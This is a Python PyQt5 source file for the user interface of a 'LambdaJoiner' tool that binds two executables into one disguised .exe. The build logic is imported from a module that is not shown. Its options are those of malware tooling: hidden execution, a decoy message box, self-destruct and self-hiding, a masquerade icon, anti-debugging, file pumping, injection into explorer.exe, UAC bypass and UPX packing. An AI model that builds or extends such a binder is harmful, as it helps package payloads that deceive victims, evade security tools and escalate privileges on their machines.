import sys
import os
import json
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout,
                             QPushButton, QLineEdit, QLabel, QFileDialog, QTextEdit,
                             QCheckBox, QComboBox, QGroupBox, QDesktopWidget,
                             QSpinBox, QScrollArea, QGridLayout, QMessageBox)
from PyQt5.QtCore import Qt, QPoint, QPropertyAnimation, QThread, QObject, pyqtSignal
from logic import process_build

# --- Worker Thread for Non-Blocking UI ---
class Worker(QObject):
    """
    Runs the build process in a separate thread to keep the UI responsive.
    """
    # Signals to communicate with the main UI thread
    log_signal = pyqtSignal(str, dict)
    finished = pyqtSignal()

    def __init__(self, options):
        super().__init__()
        self.options = options

    def run(self):
        """The main work task."""
        # The process_build function is called here. It will use the log_callback
        # to emit signals instead of directly updating the UI.
        process_build(self.options, self.log_callback)
        self.finished.emit()

    def log_callback(self, key, **kwargs):
        """Emits a signal to the main thread for logging."""
        self.log_signal.emit(key, kwargs)

# --- Custom Title Bar ---
class CustomTitleBar(QWidget):
    """Custom title bar for the main window."""
    def __init__(self, parent, title=""):
        super().__init__(parent)
        self.parent = parent
        self.old_pos = None
        layout = QHBoxLayout(self)
        layout.setContentsMargins(10, 0, 5, 0)
        layout.setSpacing(10)
        self.title_icon = QLabel("λ", self)
        self.title_label = QLabel(title, self)
        layout.addWidget(self.title_icon)
        layout.addWidget(self.title_label)
        layout.addStretch()
        self.minimize_button = QPushButton("_", self)
        self.minimize_button.setFixedSize(30, 30)
        self.minimize_button.clicked.connect(self.parent.showMinimized)
        self.close_button = QPushButton("X", self)
        self.close_button.setFixedSize(30, 30)
        self.close_button.clicked.connect(self.parent.close)
        layout.addWidget(self.minimize_button)
        layout.addWidget(self.close_button)
        self.setFixedHeight(40)

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton: self.old_pos = event.globalPos()
    def mouseMoveEvent(self, event):
        if self.old_pos:
            delta = QPoint(event.globalPos() - self.old_pos)
            self.parent.move(self.parent.x() + delta.x(), self.parent.y() + delta.y())
            self.old_pos = event.globalPos()
    def mouseReleaseEvent(self, event):
        if event.button() == Qt.LeftButton: self.old_pos = None

# --- Main Application Window ---
class LambdaJoinerApp(QWidget):
    """Main application window class."""
    def __init__(self):
        super().__init__()
        self._load_translations()
        self.current_lang = 'en-GB' # Default to English
        self.lang_map = {0: 'en-GB', 1: 'ru', 2: 'uk'}
        
        # Threading attributes
        self.build_thread = None
        self.worker = None

        self.setWindowFlags(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        
        self.init_ui()
        self.center()
        self.lang_combo.setCurrentIndex(0) # Set UI to English
        
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(500)
        self.animation.setStartValue(0)
        self.animation.setEndValue(1)
        self.animation.start()

    def _load_translations(self):
        try:
            with open('translations.json', 'r', encoding='utf-8') as f:
                self.translations = json.load(f)
        except FileNotFoundError:
            self.translations = {"en-GB": {"window_title": "Error: translations.json not found"}}
            error_box = QMessageBox()
            error_box.setIcon(QMessageBox.Critical)
            error_box.setText("Critical Error: translations.json not found.\nThe application cannot continue.")
            error_box.setWindowTitle("File Not Found")
            error_box.exec_()
            sys.exit(1)

    def tr(self, key, **kwargs):
        """Gets a translated string by its key."""
        lang_dict = self.translations.get(self.current_lang, self.translations.get('en-GB', {}))
        text = lang_dict.get(key, f"<{key}>")
        try:
            return text.format(**kwargs)
        except (KeyError, IndexError):
            return text

    def center(self):
        qr = self.frameGeometry()
        cp = QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def init_ui(self):
        self.main_container = QWidget(self)
        self.main_container.setObjectName("mainContainer")
        self.setStyleSheet("""
            #mainContainer { background-color: #1a1a1a; border: 1px solid #00ff7f; border-radius: 10px; }
            QWidget { color: #00ff7f; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
            QScrollArea { border: none; background-color: transparent; }
            #scrollAreaWidget { background-color: transparent; }
            CustomTitleBar { background-color: #222; } CustomTitleBar QLabel { color: #00ff7f; font-weight: bold; }
            CustomTitleBar QPushButton { background-color: transparent; color: #00ff7f; border: 1px solid #00ff7f; border-radius: 5px; font-weight: bold; }
            CustomTitleBar QPushButton:hover { background-color: #00ff7f; color: #1a1a1a; }
            QGroupBox { font-weight: bold; border: 1px solid #333; border-radius: 5px; margin-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top left; padding: 0 5px; color: #00ff7f; }
            QLineEdit { background-color: #2c2c2c; border: 1px solid #00ff7f; border-radius: 5px; padding: 8px; color: #e0e0e0; }
            QPushButton#buildButton { background-color: #00ff7f; color: #1a1a1a; border: none; border-radius: 5px; padding: 10px; font-weight: bold; }
            QPushButton#buildButton:hover { background-color: #33ff99; }
            QPushButton#buildButton:disabled { background-color: #555; color: #999; }
            QPushButton { background-color: #2c2c2c; color: #00ff7f; border: 1px solid #00ff7f; padding: 8px; }
            QPushButton:hover { background-color: #3e3e3e; }
            QCheckBox, QComboBox, QSpinBox { padding: 5px; }
            QComboBox, QSpinBox { background-color: #2c2c2c; border: 1px solid #00ff7f; border-radius: 5px; }
            QTextEdit { background-color: #111; border: 1px solid #333; border-radius: 5px; }
            #warningLabel { color: #ffcc00; font-style: italic; }
        """)

        container_layout = QVBoxLayout(self.main_container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        self.title_bar = CustomTitleBar(self)
        container_layout.addWidget(self.title_bar)

        scroll_area = QScrollArea(self)
        scroll_area.setWidgetResizable(True)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        
        scroll_area_widget = QWidget()
        scroll_area_widget.setObjectName("scrollAreaWidget")
        
        grid_layout = QGridLayout(scroll_area_widget)
        grid_layout.setSpacing(10)
        
        lang_layout = QHBoxLayout()
        self.lang_label = QLabel()
        self.lang_combo = QComboBox()
        self.lang_combo.addItems(["English (UK)", "Русский", "Українська"])
        self.lang_combo.currentIndexChanged.connect(self.change_language)
        lang_layout.addWidget(self.lang_label)
        lang_layout.addWidget(self.lang_combo)
        lang_layout.addStretch()
        grid_layout.addLayout(lang_layout, 0, 0, 1, 2)

        left_column_layout = QVBoxLayout()
        self.file1_group = QGroupBox()
        file1_group_layout = QVBoxLayout(self.file1_group)
        file1_layout, self.file1_path_edit, self.file1_browse_btn = self._create_file_selector(lambda: self._browse_file(self.file1_path_edit))
        self.file1_hide_checkbox = QCheckBox()
        self.file1_hide_checkbox.setChecked(True)
        file1_group_layout.addLayout(file1_layout)
        file1_group_layout.addWidget(self.file1_hide_checkbox)
        left_column_layout.addWidget(self.file1_group)

        self.file2_group = QGroupBox()
        file2_group_layout = QVBoxLayout(self.file2_group)
        file2_path_layout, self.file2_path_edit, self.file2_browse_btn = self._create_file_selector(lambda: self._browse_file(self.file2_path_edit))
        self.file2_hide_checkbox = QCheckBox()
        self.file2_hide_checkbox.setChecked(True)
        file2_group_layout.addLayout(file2_path_layout)
        file2_group_layout.addWidget(self.file2_hide_checkbox)
        left_column_layout.addWidget(self.file2_group)
        
        self.launch_behavior_group = QGroupBox()
        launch_layout = QVBoxLayout(self.launch_behavior_group)
        self.msgbox_checkbox = QCheckBox()
        self.msgbox_checkbox.toggled.connect(self._toggle_msgbox_options)
        launch_layout.addWidget(self.msgbox_checkbox)
        msgbox_type_layout = QHBoxLayout()
        self.msgbox_type_label = QLabel()
        self.msgbox_type_combo = QComboBox()
        msgbox_type_layout.addWidget(self.msgbox_type_label)
        msgbox_type_layout.addWidget(self.msgbox_type_combo)
        msgbox_type_layout.addStretch()
        launch_layout.addLayout(msgbox_type_layout)
        msgbox_title_layout = QHBoxLayout()
        self.msgbox_title_label = QLabel()
        self.msgbox_title_edit = QLineEdit()
        msgbox_title_layout.addWidget(self.msgbox_title_label)
        msgbox_title_layout.addWidget(self.msgbox_title_edit)
        launch_layout.addLayout(msgbox_title_layout)
        msgbox_text_layout = QHBoxLayout()
        self.msgbox_text_label = QLabel()
        self.msgbox_text_edit = QLineEdit()
        msgbox_text_layout.addWidget(self.msgbox_text_label)
        msgbox_text_layout.addWidget(self.msgbox_text_edit)
        launch_layout.addLayout(msgbox_text_layout)
        self.self_destruct_checkbox = QCheckBox()
        self.self_hide_checkbox = QCheckBox()
        launch_layout.addWidget(self.self_destruct_checkbox)
        launch_layout.addWidget(self.self_hide_checkbox)
        left_column_layout.addWidget(self.launch_behavior_group)
        self._toggle_msgbox_options(False)
        left_column_layout.addStretch()
        
        right_column_layout = QVBoxLayout()
        self.masquerade_group = QGroupBox()
        masquerade_layout = QVBoxLayout(self.masquerade_group)
        icon_layout, self.icon_file_label, self.icon_path_edit, self.icon_browse_btn = self._create_file_selector(self._browse_icon, has_label=True)
        masquerade_layout.addLayout(icon_layout)
        right_column_layout.addWidget(self.masquerade_group)
        self.adv_group = QGroupBox()
        adv_layout = QVBoxLayout(self.adv_group)
        self.anti_debug_checkbox = QCheckBox()
        adv_layout.addWidget(self.anti_debug_checkbox)
        pump_layout = QHBoxLayout()
        self.pump_checkbox = QCheckBox()
        self.pump_size_spinbox = QSpinBox()
        self.pump_size_spinbox.setRange(1, 500)
        self.pump_size_spinbox.setValue(10)
        pump_layout.addWidget(self.pump_checkbox)
        pump_layout.addWidget(self.pump_size_spinbox)
        pump_layout.addStretch()
        adv_layout.addLayout(pump_layout)
        right_column_layout.addWidget(self.adv_group)
        self.injection_group = QGroupBox()
        injection_layout = QHBoxLayout(self.injection_group)
        self.injection_checkbox = QCheckBox()
        self.injection_checkbox.toggled.connect(self.file1_hide_checkbox.setDisabled)
        injection_layout.addWidget(self.injection_checkbox)
        self.injection_target_label = QLabel()
        injection_layout.addWidget(self.injection_target_label)
        self.injection_target_edit = QLineEdit("explorer.exe")
        injection_layout.addWidget(self.injection_target_edit)
        right_column_layout.addWidget(self.injection_group)
        self.uac_bypass_group = QGroupBox()
        uac_bypass_layout = QVBoxLayout(self.uac_bypass_group)
        self.uac_bypass_checkbox = QCheckBox()
        self.uac_bypass_checkbox.toggled.connect(self._toggle_uac_bypass_options)
        uac_bypass_layout.addWidget(self.uac_bypass_checkbox)
        uac_payload_layout = QHBoxLayout()
        self.uac_bypass_payload_label = QLabel()
        self.uac_bypass_payload_combo = QComboBox()
        uac_payload_layout.addWidget(self.uac_bypass_payload_label)
        uac_payload_layout.addWidget(self.uac_bypass_payload_combo)
        uac_payload_layout.addStretch()
        uac_bypass_layout.addLayout(uac_payload_layout)
        right_column_layout.addWidget(self.uac_bypass_group)
        self._toggle_uac_bypass_options(False)
        self.upx_groupbox = QGroupBox()
        upx_layout = QVBoxLayout(self.upx_groupbox)
        self.upx_checkbox = QCheckBox()
        upx_layout.addWidget(self.upx_checkbox)
        upx_level_layout = QHBoxLayout()
        self.upx_level_label = QLabel()
        self.upx_level_combo = QComboBox()
        self.upx_level_combo.addItems([str(i) for i in range(1, 10)])
        self.upx_level_combo.setCurrentText("9")
        upx_level_layout.addWidget(self.upx_level_label)
        upx_level_layout.addWidget(self.upx_level_combo)
        upx_level_layout.addStretch()
        upx_layout.addLayout(upx_level_layout)
        self.upx_warning_label = QLabel()
        self.upx_warning_label.setObjectName("warningLabel")
        upx_layout.addWidget(self.upx_warning_label)
        right_column_layout.addWidget(self.upx_groupbox)
        right_column_layout.addStretch()
        
        grid_layout.addLayout(left_column_layout, 1, 0)
        grid_layout.addLayout(right_column_layout, 1, 1)

        output_layout, self.output_path_label, self.output_path_edit, self.output_browse_btn = self._create_file_selector(self._browse_output_file, is_save=True, has_label=True)
        grid_layout.addLayout(output_layout, 2, 0, 1, 2)
        
        self.build_button = QPushButton()
        self.build_button.setObjectName("buildButton")
        self.build_button.clicked.connect(self._start_build_process)
        grid_layout.addWidget(self.build_button, 3, 0, 1, 2)
        
        self.log_label = QLabel()
        grid_layout.addWidget(self.log_label, 4, 0, 1, 2)
        
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        grid_layout.addWidget(self.log_area, 5, 0, 1, 2)
        
        grid_layout.setRowStretch(5, 1)
        grid_layout.setColumnStretch(0, 1)
        grid_layout.setColumnStretch(1, 1)

        scroll_area.setWidget(scroll_area_widget)
        container_layout.addWidget(scroll_area)
        
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0,0,0,0)
        main_layout.addWidget(self.main_container)
        self.setLayout(main_layout)
        
        self.resize(1200, 900)
        self.update_ui_texts()

    def change_language(self, index):
        self.current_lang = self.lang_map.get(index, 'en-GB')
        self.update_ui_texts()

    def update_ui_texts(self):
        """Updates all text elements in the UI based on the current language."""
        self.title_bar.title_label.setText(self.tr('window_title'))
        self.lang_label.setText(self.tr('lang_label'))
        
        self.file1_group.setTitle(self.tr('file1_group'))
        self.file1_hide_checkbox.setText(self.tr('run_hidden'))
        self.file1_browse_btn.setText(self.tr('browse_button'))
        
        self.file2_group.setTitle(self.tr('payload2_group'))
        self.file2_browse_btn.setText(self.tr('browse_button'))
        self.file2_hide_checkbox.setText(self.tr('run_hidden'))

        self.launch_behavior_group.setTitle(self.tr('launch_behavior_group'))
        self.msgbox_checkbox.setText(self.tr('msgbox_check'))
        self.msgbox_type_label.setText(self.tr('msgbox_type_label'))
        
        self.msgbox_type_combo.clear()
        self.msgbox_type_combo.addItems([self.tr('msgbox_type_error'), self.tr('msgbox_type_info'), self.tr('msgbox_type_warning')])
        
        self.msgbox_title_label.setText(self.tr('msgbox_title_label'))
        self.msgbox_text_label.setText(self.tr('msgbox_text_label'))
        self.self_destruct_checkbox.setText(self.tr('self_destruct_check'))
        self.self_hide_checkbox.setText(self.tr('self_hide_check'))
        self.msgbox_title_edit.setText(self.tr('default_msgbox_title'))
        self.msgbox_text_edit.setText(self.tr('default_msgbox_text'))

        self.masquerade_group.setTitle(self.tr('masquerade_group'))
        self.icon_file_label.setText(self.tr('icon_file_label'))
        self.icon_browse_btn.setText(self.tr('browse_button'))

        self.adv_group.setTitle(self.tr('evasion_obfuscation_group'))
        self.anti_debug_checkbox.setText(self.tr('anti_debug_check'))
        self.pump_checkbox.setText(self.tr('pump_file_check'))
        self.injection_group.setTitle(self.tr('injection_group'))
        self.injection_checkbox.setText(self.tr('injection_check'))
        self.injection_target_label.setText(self.tr('injection_target_label'))
        
        self.uac_bypass_group.setTitle(self.tr('uac_bypass_group'))
        self.uac_bypass_checkbox.setText(self.tr('uac_bypass_check'))
        self.uac_bypass_payload_label.setText(self.tr('uac_bypass_payload_label'))
        self.uac_bypass_payload_combo.clear()
        self.uac_bypass_payload_combo.addItems([self.tr('uac_bypass_payload_none'), self.tr('uac_bypass_payload_file1'), self.tr('uac_bypass_payload_file2')])

        self.upx_groupbox.setTitle(self.tr('upx_group'))
        self.upx_checkbox.setText(self.tr('upx_pack_check'))
        self.upx_level_label.setText(self.tr('upx_level_label'))
        self.upx_warning_label.setText(self.tr('upx_warning'))
        self.output_path_label.setText(self.tr('output_file_label'))
        self.output_browse_btn.setText(self.tr('save_as_button'))
        self.build_button.setText(self.tr('build_button'))
        self.log_label.setText(self.tr('log_label'))

    def _toggle_msgbox_options(self, checked):
        self.msgbox_type_label.setEnabled(checked)
        self.msgbox_type_combo.setEnabled(checked)
        self.msgbox_title_label.setEnabled(checked)
        self.msgbox_title_edit.setEnabled(checked)
        self.msgbox_text_label.setEnabled(checked)
        self.msgbox_text_edit.setEnabled(checked)

    def _toggle_uac_bypass_options(self, checked):
        self.uac_bypass_payload_label.setEnabled(checked)
        self.uac_bypass_payload_combo.setEnabled(checked)

    def _create_file_selector(self, browse_function, is_save=False, has_label=False):
        layout = QHBoxLayout()
        label = QLabel() if has_label else None
        if label:
            label.setFixedWidth(150)
            layout.addWidget(label)
        
        line_edit = QLineEdit()
        button = QPushButton()
        button.setFixedWidth(120)
        button.clicked.connect(browse_function)
        layout.addWidget(line_edit, 1)  
        layout.addWidget(button)
        
        if has_label:
            return layout, label, line_edit, button
        else:
            return layout, line_edit, button

    def _browse_file(self, line_edit):
        fname, _ = QFileDialog.getOpenFileName(self, self.tr('dialog_select_file'), '', 'All Files (*)')
        if fname: line_edit.setText(fname)

    def _browse_icon(self):
        fname, _ = QFileDialog.getOpenFileName(self, self.tr('dialog_select_icon'), '', 'Icon files (*.ico)')
        if fname: self.icon_path_edit.setText(fname)
    
    def _browse_output_file(self):
        fname, _ = QFileDialog.getSaveFileName(self, self.tr('dialog_save_executable'), '', 'Executable (*.exe)')
        if fname:
            if not fname.lower().endswith('.exe'): fname += '.exe'
            self.output_path_edit.setText(fname)

    def _log(self, key, **kwargs):
        """Logs a message to the text area in the UI."""
        message = self.tr(key, **kwargs)
        self.log_area.append(message)
        QApplication.processEvents()

    def _start_build_process(self):
        """Gathers all options from the UI and starts the build process in a worker thread."""
        self.log_area.clear()
        log_art = """  _          _                    _           _       _       
 | |        | |                  | |         | |     | |      
 | |     ___| | ___  _ __   __ _ | |__   ___ | |_    | | ___  
 | |    / _ \\ |/ _ \\| '_ \\ / _` || '_ \\ / _ \\| __|   | |/ _ \\ 
 | |___|  __/ |  __/| | | | (_| || |_) |  __/| |_    | | (_) |
 |______\\___|_|\\___||_| |_|\\__,_||_.__/ \\___| \\__|   |_|\\___/ 
                                                             
                                                             """
        self.log_area.append(log_art)

        uac_bypass_payload_map = {0: "none", 1: "file1", 2: "file2"}
        
        options = {
            'file1_path': self.file1_path_edit.text(),
            'file2_path': self.file2_path_edit.text(),
            'output_path': self.output_path_edit.text(),
            'show_cmd1': "SW_HIDE" if self.file1_hide_checkbox.isChecked() else "SW_SHOWNORMAL",
            'show_cmd2': "SW_HIDE" if self.file2_hide_checkbox.isChecked() else "SW_SHOWNORMAL",
            'use_msgbox': self.msgbox_checkbox.isChecked(),
            'msgbox_type': self.msgbox_type_combo.currentText(),
            'msg_title': self.msgbox_title_edit.text(),
            'msg_text': self.msgbox_text_edit.text(),
            'self_destruct': self.self_destruct_checkbox.isChecked(),
            'self_hide': self.self_hide_checkbox.isChecked(),
            'icon_path': self.icon_path_edit.text(),
            'use_anti_debug': self.anti_debug_checkbox.isChecked(),
            'pump_file': self.pump_checkbox.isChecked(),
            'pump_size': self.pump_size_spinbox.value(),
            'use_injection': self.injection_checkbox.isChecked(),
            'target_proc': self.injection_target_edit.text(),
            'use_uac_bypass': self.uac_bypass_checkbox.isChecked(),
            'uac_bypass_payload': uac_bypass_payload_map.get(self.uac_bypass_payload_combo.currentIndex(), "none"),
            'upx_pack': self.upx_checkbox.isChecked(),
            'upx_level': self.upx_level_combo.currentText(),
        }
        
        # --- Threading Setup ---
        self.build_button.setEnabled(False)
        self.build_button.setText(self.tr('build_in_progress'))

        self.build_thread = QThread()
        self.worker = Worker(options)
        self.worker.moveToThread(self.build_thread)

        # Connect signals from the worker to slots in the UI
        self.build_thread.started.connect(self.worker.run)
        self.worker.finished.connect(self.build_thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.build_thread.finished.connect(self.build_thread.deleteLater)
        self.worker.log_signal.connect(self.log_from_thread)
        self.build_thread.finished.connect(self._on_build_finished)

        # Start the thread
        self.build_thread.start()

    def log_from_thread(self, key, kwargs_dict):
        """Slot to receive log messages from the worker thread."""
        self._log(key, **kwargs_dict)

    def _on_build_finished(self):
        """Slot to re-enable the UI after the build is complete."""
        self.build_button.setEnabled(True)
        self.build_button.setText(self.tr('build_button'))

